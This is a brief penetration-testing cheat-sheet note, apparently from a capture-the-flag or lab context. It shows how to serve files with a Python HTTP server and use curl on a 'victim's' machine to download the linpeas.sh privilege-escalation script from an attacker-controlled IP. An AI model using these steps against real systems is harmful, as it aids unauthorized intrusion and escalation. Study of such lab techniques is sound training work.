# How to transfer file from your machine to victim's?

1. Open http server using Python
```
python3 -m http.server 80
```
2. On victim's machine type:
```
curl -O http://10.10.14.24/linpeas.sh
```
